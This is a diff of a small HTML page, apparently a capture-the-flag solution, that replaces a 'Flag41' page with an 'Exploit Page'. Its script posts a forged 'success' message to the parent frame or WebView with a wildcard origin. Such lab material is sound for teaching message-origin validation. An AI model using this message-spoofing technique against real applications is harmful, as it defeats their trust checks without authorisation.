@@ -1,12 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Flag41</title>
+    <script>
+        function sendSuccessMessage() {
+            const payload = {
+                message: "success",
+                data: ""  // Keep this empty to match the expected format
+            };
+
+            window.parent.postMessage(JSON.stringify(payload), "*"); 
+        }
+
+        window.onload = function () {
+            setTimeout(sendSuccessMessage, 1000); // Wait for WebView to initialize
+        };
+    </script>
 </head>
 <body>
-<h1>Flag41</h1>
-<script>window.parent.postMessage({ message: "success"});</script>
-
+    <h1>Exploit Page</h1>
 </body>
 </html>
